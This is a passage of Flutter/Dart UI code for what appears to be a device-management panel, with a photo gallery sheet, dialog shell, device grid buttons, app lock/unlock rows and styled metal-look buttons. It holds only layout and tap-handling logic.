                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _MetalIconButton(
                      icon: Icons.close_rounded,
                      size: 30,
                      onTap: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  itemCount: items.length,
                  itemBuilder: (_, i) {
                    final data = mapFn(items[i]);
                    return Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(8),
                        color: Colors.black.withOpacity(0.5),
                        border: Border.all(
                            color: Sk.metalDark, width: 1),
                      ),
                      child: Row(
                        children: [
                          Container(
                            width: 34,
                            height: 34,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: Sk.redDeep,
                              border: Border.all(
                                  color: Sk.redGlow.withOpacity(0.5),
                                  width: 1),
                            ),
                            child: Icon(icon,
                                color: Sk.redGlow, size: 14),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment:
                                  CrossAxisAlignment.start,
                              children: [
                                Text(
                                  data['title'] ?? '-',
                                  style: const TextStyle(
                                    color: Sk.cream,
                                    fontSize: 11,
                                    fontFamily: 'ShareTechMono',
                                    fontWeight: FontWeight.w700,
                                  ),
                                  maxLines: 1,
                                  overflow: TextOverflow.ellipsis,
                                ),
                                if ((data['subtitle'] ?? '').isNotEmpty) ...[
                                  const SizedBox(height: 2),
                                  Text(
                                    data['subtitle'] ?? '',
                                    style: TextStyle(
                                      color: Sk.cream.withOpacity(0.5),
                                      fontSize: 9,
                                      fontFamily: 'ShareTechMono',
                                      fontWeight: FontWeight.w500,
                                    ),
                                    maxLines: 2,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ],
                              ],
                            ),
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => Container(
        height: MediaQuery.of(context).size.height * 0.75,
        decoration: const BoxDecoration(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              Color(0xFF2A1F18),
              Color(0xFF1A1310),
              Color(0xFF0F0A08),
            ],
          ),
        ),
        child: SafeArea(
          top: false,
          child: Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 10),
                width: 50,
                height: 4,
                decoration: BoxDecoration(
                  color: Sk.metalLight,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(14),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: Sk.redDeep,
                        border: Border.all(
                            color: Sk.redGlow.withOpacity(0.6), width: 1),
                      ),
                      child: const Icon(Icons.photo_library_rounded,
                          color: Sk.redGlow, size: 16),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        'GALLERY (${imgs.length})',
                        style: const TextStyle(
                          color: Sk.brass,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _MetalIconButton(
                      icon: Icons.close_rounded,
                      size: 30,
                      onTap: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: imgs.isEmpty
                    ? const Center(
                        child: Text(
                          'NO PHOTOS',
                          style: TextStyle(
                            color: Sk.brass,
                            fontSize: 10,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1.5,
                          ),
                        ),
                      )
                    : GridView.builder(
                        padding: const EdgeInsets.all(10),
                        gridDelegate:
                            const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3,
                          crossAxisSpacing: 4,
                          mainAxisSpacing: 4,
                        ),
                        itemCount: imgs.length,
                        itemBuilder: (_, i) {
                          try {
                            final raw = imgs[i].toString();
                            final clean = raw.contains(',')
                                ? raw.split(',').last
                                : raw;
                            final bytes = base64Decode(clean);
                            return GestureDetector(
                              onTap: () =>
                                  _imgDialog(raw, 'Photo ${i + 1}'),
                              child: ClipRRect(
                                borderRadius: BorderRadius.circular(6),
                                child: Image.memory(bytes,
                                    fit: BoxFit.cover),
                              ),
                            );
                          } catch (_) {
                            return Container(
                              decoration: BoxDecoration(
                                color: Sk.metalDark,
                                borderRadius: BorderRadius.circular(6),
                              ),
                            );
                          }
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOG BUILDER (reusable shell)
  // ═══════════════════════════════════════════════════════════
  Widget _buildDialog({
    required IconData icon,
    required Color iconColor,
    required String title,
    required String subtitle,
    required Widget child,
    required List<Widget> actions,
  }) {
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: const EdgeInsets.symmetric(horizontal: 20),
      child: _SoftPanel(
        padding: const EdgeInsets.all(18),
        accent: iconColor.withOpacity(0.6),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: iconColor.withOpacity(0.15),
                    border: Border.all(
                        color: iconColor.withOpacity(0.6), width: 1.2),
                    boxShadow: [
                      BoxShadow(
                        color: iconColor.withOpacity(0.3),
                        blurRadius: 10,
                        spreadRadius: 0,
                      ),
                    ],
                  ),
                  child: Icon(icon, color: iconColor, size: 18),
                ),
                const SizedBox(width: 12),
                const _Screw(size: 10),
                const SizedBox(width: 8),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: const TextStyle(
                          color: Sk.brass,
                          fontSize: 12,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 1.5,
                          shadows: [
                            Shadow(
                              color: Colors.black,
                              offset: Offset(0, 1),
                              blurRadius: 2,
                            ),
                          ],
                        ),
                      ),
                      if (subtitle.isNotEmpty) ...[
                        const SizedBox(height: 2),
                        Text(
                          subtitle,
                          style: TextStyle(
                            color: Sk.cream.withOpacity(0.6),
                            fontSize: 9,
                            fontFamily: 'ShareTechMono',
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ],
                    ],
                  ),
                ),
                const _Screw(size: 10),
              ],
            ),
            if (child is! SizedBox) ...[
              const SizedBox(height: 16),
              child,
            ],
            const SizedBox(height: 18),
            Row(
              children: actions
                  .map((a) => Expanded(child: a))
                  .expand((w) => [w, const SizedBox(width: 10)])
                  .toList()
                ..removeLast(),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// DEVICE BUTTON (Grid button)
// ═══════════════════════════════════════════════════════════
class _DeviceButton extends StatefulWidget {
  final String label;
  final IconData icon;
  final Color color;
  final VoidCallback onTap;
  const _DeviceButton({
    required this.label,
    required this.icon,
    required this.color,
    required this.onTap,
  });

  @override
  State<_DeviceButton> createState() => _DeviceButtonState();
}

class _DeviceButtonState extends State<_DeviceButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        HapticFeedback.lightImpact();
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: (MediaQuery.of(context).size.width - 40) / 2 - 5,
        height: 78,
        transform: Matrix4.translationValues(
          _pressed ? 2 : 0,
          _pressed ? 2 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: _pressed
                ? [Sk.leatherDark, Sk.leather]
                : [Sk.leather, Sk.leatherDark],
          ),
          border: Border.all(
            color: widget.color.withOpacity(_pressed ? 0.9 : 0.4),
            width: 1.2,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                  BoxShadow(
                    color: widget.color.withOpacity(0.15),
                    blurRadius: 8,
                    spreadRadius: 0,
                  ),
                ],
        ),
        child: Stack(
          children: [
            // Corner rivets
            const Positioned(top: 4, left: 4, child: _Rivet(size: 4)),
            const Positioned(top: 4, right: 4, child: _Rivet(size: 4)),
            const Positioned(bottom: 4, left: 4, child: _Rivet(size: 4)),
            const Positioned(bottom: 4, right: 4, child: _Rivet(size: 4)),

            Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Container(
                    width: 32,
                    height: 32,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: widget.color.withOpacity(0.15),
                      border: Border.all(
                        color: widget.color.withOpacity(0.6),
                        width: 1.2,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: widget.color.withOpacity(0.3),
                          blurRadius: 8,
                          spreadRadius: 0,
                        ),
                      ],
                    ),
                    child: Icon(
                      widget.icon,
                      color: widget.color,
                      size: 15,
                    ),
                  ),
                  const SizedBox(height: 6),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 6),
                    child: Text(
                      widget.label.toUpperCase(),
                      style: const TextStyle(
                        color: Sk.cream,
                        fontSize: 8,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Orbitron',
                        letterSpacing: 0.5,
                        height: 1.2,
                        shadows: [
                          Shadow(
                            color: Colors.black,
                            offset: Offset(0, 1),
                            blurRadius: 2,
                          ),
                        ],
                      ),
                      textAlign: TextAlign.center,
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// APP ROW
// ═══════════════════════════════════════════════════════════
class _AppRow extends StatelessWidget {
  final String appName;
  final String package;
  final bool isLocked;
  final VoidCallback onToggle;

  const _AppRow({
    required this.appName,
    required this.package,
    required this.isLocked,
    required this.onToggle,
  });

  @override
  Widget build(BuildContext context) {
    final accent = isLocked ? Sk.redBright : Sk.metalLight;

    return Container(
      margin: const EdgeInsets.only(bottom: 6),
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: isLocked
            ? Sk.redDeep.withOpacity(0.4)
            : Colors.black.withOpacity(0.4),
        border: Border.all(
          color: isLocked
              ? Sk.redBright.withOpacity(0.5)
              : Sk.metalDark,
          width: 1,
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 32,
            height: 32,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: isLocked
                  ? Sk.redDeep
                  : Sk.metalMid.withOpacity(0.4),
              border: Border.all(color: accent, width: 1),
            ),
            child: Icon(
              isLocked ? Icons.lock_rounded : Icons.apps_rounded,
              color: isLocked ? Sk.redGlow : Sk.metalLight,
              size: 14,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  appName,
                  style: TextStyle(
                    color: isLocked ? Sk.redGlow : Sk.cream,
                    fontSize: 11,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'Orbitron',
                    letterSpacing: 0.3,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                Text(
                  package,
                  style: TextStyle(
                    color: Sk.cream.withOpacity(0.4),
                    fontSize: 8,
                    fontFamily: 'ShareTechMono',
                    fontWeight: FontWeight.w700,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          _SmallActionButton(
            label: isLocked ? 'UNLOCK' : 'LOCK',
            color: isLocked ? Sk.greenHi : Sk.redBright,
            icon: isLocked
                ? Icons.lock_open_rounded
                : Icons.lock_rounded,
            onTap: onToggle,
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// SMALL ACTION BUTTON
// ═══════════════════════════════════════════════════════════
class _SmallActionButton extends StatefulWidget {
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;
  const _SmallActionButton({
    required this.label,
    required this.color,
    required this.icon,
    required this.onTap,
  });

  @override
  State<_SmallActionButton> createState() => _SmallActionButtonState();
}

class _SmallActionButtonState extends State<_SmallActionButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
        transform: Matrix4.translationValues(
          _pressed ? 1 : 0,
          _pressed ? 1 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(6),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: _pressed
                ? [widget.color.withOpacity(0.4), widget.color.withOpacity(0.2)]
                : [widget.color.withOpacity(0.8), widget.color.withOpacity(0.5)],
          ),
          border: Border.all(
            color: widget.color,
            width: 1.2,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: widget.color.withOpacity(0.3),
                    blurRadius: 6,
                    spreadRadius: 0,
                  ),
                ],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(widget.icon, color: Colors.white, size: 10),
            const SizedBox(width: 4),
            Text(
              widget.label,
              style: const TextStyle(
                color: Colors.white,
                fontSize: 8,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron',
                letterSpacing: 0.8,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// METAL BUTTON
// ═══════════════════════════════════════════════════════════
class _MetalButton extends StatefulWidget {
  final String label;
  final Color color;
  final double height;
  final VoidCallback? onTap;
  final IconData? icon;
  const _MetalButton({
    required this.label,
    required this.color,
    required this.height,
    required this.onTap,
    this.icon,
  });

  @override
  State<_MetalButton> createState() => _MetalButtonState();
}

class _MetalButtonState extends State<_MetalButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final disabled = widget.onTap == null;

    return GestureDetector(
      onTapDown: disabled
          ? null
          : (_) => setState(() => _pressed = true),
      onTapUp: disabled
          ? null
          : (_) {
              setState(() => _pressed = false);
              widget.onTap?.call();
            },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        height: widget.height,
        transform: Matrix4.translationValues(
          _pressed ? 1.5 : 0,
          _pressed ? 1.5 : 0,
          0,
        ),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(8),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: disabled
                ? [Sk.metalMid, Sk.metalDark]
                : [
                    widget.color.withOpacity(0.9),
                    widget.color,
                    widget.color.withOpacity(0.7),
                  ],
          ),
          border: Border.all(
            color: disabled
                ? Sk.metalDark
                : widget.color.withOpacity(0.9),
            width: 1.5,
          ),
          boxShadow: _pressed || disabled
              ? []
              : [
                  BoxShadow(
                    color: widget.color.withOpacity(0.35),
                    blurRadius: 8,
                    spreadRadius: 0,
                  ),
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                ],
        ),
        child: Stack(
          children: [
            const Positioned(top: 3, left: 3, child: _Rivet(size: 4)),
            const Positioned(top: 3, right: 3, child: _Rivet(size: 4)),
            const Positioned(bottom: 3, left: 3, child: _Rivet(size: 4)),
            const Positioned(bottom: 3, right: 3, child: _Rivet(size: 4)),

            Center(
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  if (widget.icon != null) ...[
                    Icon(widget.icon, color: Sk.cream, size: 14),
                    const SizedBox(width: 6),
                  ],
                  Text(
                    widget.label,
                    style: const TextStyle(
                      color: Sk.cream,
                      fontSize: 11,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.5,
                      shadows: [
                        Shadow(
                          color: Colors.black54,
                          offset: Offset(0, 1),
                          blurRadius: 2,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// SEND BUTTON
// ═══════════════════════════════════════════════════════════
class _SendButton extends StatefulWidget {
  final VoidCallback onTap;
  const _SendButton({required this.onTap});

  @override
  State<_SendButton> createState() => _SendButtonState();
}

class _SendButtonState extends State<_SendButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: 42,
        height: 42,
        transform: Matrix4.translationValues(
          _pressed ? 1.5 : 0,
          _pressed ? 1.5 : 0,
          0,
        ),
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: const LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Sk.purpleHi, Sk.purple, Sk.purpleDeep],
          ),
          border: Border.all(color: Sk.purpleDeep, width: 1.5),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: Sk.purpleHi.withOpacity(0.5),
                    blurRadius: 10,
                    spreadRadius: 0,
                  ),
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    offset: const Offset(0, 3),
                    blurRadius: 5,
                  ),
                ],
        ),
        child: const Icon(
          Icons.send_rounded,
          color: Colors.white,
          size: 16,
          shadows: [
            Shadow(
              color: Colors.black54,
              offset: Offset(0, 1),
              blurRadius: 2,
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// METAL ICON BUTTON
// ═══════════════════════════════════════════════════════════
class _MetalIconButton extends StatefulWidget {
  final IconData icon;
  final VoidCallback onTap;
  final double size;
  const _MetalIconButton({
    required this.icon,
    required this.onTap,
    this.size = 34,
  });

  @override
  State<_MetalIconButton> createState() => _MetalIconButtonState();
}

class _MetalIconButtonState extends State<_MetalIconButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: widget.size,
        height: widget.size,
        transform: Matrix4.translationValues(
          _pressed ? 1 : 0,
          _pressed ? 1 : 0,
          0,
        ),
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: const LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Sk.metalLight, Sk.metalDark],
          ),
          border: Border.all(
            color: Sk.metalHi.withOpacity(0.5),
            width: 1,
          ),
          boxShadow: _pressed
              ? []
              : [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.6),
                    offset: const Offset(0, 2),
                    blurRadius: 3,
                  ),
                ],
        ),
        child: Icon(
          widget.icon,
          color: Sk.redBright,
          size: widget.size * 0.42,
        ),
      ),
    );
  }
}